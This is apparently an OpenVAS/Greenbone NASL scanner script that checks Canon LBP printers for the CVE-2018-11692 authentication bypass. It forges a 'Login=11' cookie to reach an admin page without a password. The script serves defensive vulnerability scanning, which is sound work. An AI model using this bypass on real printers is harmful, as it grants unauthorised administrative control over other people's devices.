# Copyright (C) 2018 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if( description )
{
  script_oid("1.3.6.1.4.1.25623.1.0.113207");
  script_version("2022-04-14T12:29:20+0000");
  script_tag(name:"last_modification", value:"2022-04-14 12:29:20 +0000 (Thu, 14 Apr 2022)");
  script_tag(name:"creation_date", value:"2018-06-06 13:10:45 +0200 (Wed, 06 Jun 2018)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2018-07-20 15:28:00 +0000 (Fri, 20 Jul 2018)");

  script_cve_id("CVE-2018-11692");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"Mitigation");

  script_name("Canon Printers Authentication Bypass Vulnerability (Jul 2018)");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_canon_printer_consolidation.nasl");
  script_mandatory_keys("canon/printer/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Canon Printers LBP6650, LBP3370, LBP3460 and LBP7550C are prone
  to an authentication bypass vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"The authentication is handled by a cookie, which can be
  modified.");

  script_tag(name:"impact", value:"Successful exploitation would allow an attacker to gain
  administrative control over the target system.");

  script_tag(name:"affected", value:"Canon Printers LBP6650, LBP3370, LBP3460 and LBP7550C.");

  script_tag(name:"solution", value:"The vendor reportedly responded that this issue occurs when a
  customer keeps the default settings without using the countermeasures and best practices shown in
  the documentation.");

  script_xref(name:"URL", value:"https://gist.github.com/huykha/2dfbe97810e96a05e67359fd9e7cc9ff");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");

cpe_list = make_list( "cpe:/h:canon:lbp6650",
                      "cpe:/h:canon:lbp3370",
                      "cpe:/h:canon:lbp3460",
                      "cpe:/h:canon:lbp7750c" );

if( ! infos = get_app_port_from_list( cpe_list:cpe_list, service:"www" ) )
  exit( 0 );

cpe = infos["cpe"];
port = infos["port"];

if( ! get_app_location( cpe:cpe, port:port, nofork:TRUE ) )
  exit( 0 );

login_data = "Action=LOGIN&ErrDetail=&Lang=1&Language=1&login_mode=user&admin_password=&user_name=";
login_headers = make_array( "Content-Type", "application/x-www-form-urlencoded" );

req = http_post_put_req( port:port, url:"/tlogin.cgi", data:login_data,
                         accept_header:"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                         add_headers:login_headers );
res = http_keepalive_send_recv( port:port, data:req );

if( egrep( string:res, pattern:"Set-Cookie", icase:TRUE ) ) {
  cookie_match = eregmatch( string:res, pattern:'[Ss]et-[Cc]ookie: ?[Cc]ookie[Ii][Dd]=([^\r\n]+)' );
  if( isnull( cookie_match[1] ) )
    exit( 0 );

  cookie = cookie_match[1];

  cookie_header = make_array( "Cookie", "CookieID=" + cookie + "; Login=11" );

  url = "/frame.cgi?page=DevInfoSetDev";
  req = http_get_req( port:port, url:url, add_headers:cookie_header,
                      accept_header:"*/*;q=0.8" );
  res = http_keepalive_send_recv( data:req, port:port );

  if( 'switch("DevInfoSetDev")' >< res ) {
    report = "It was possible to acquire administrative privileges without a password.";
    report += '\n' + http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
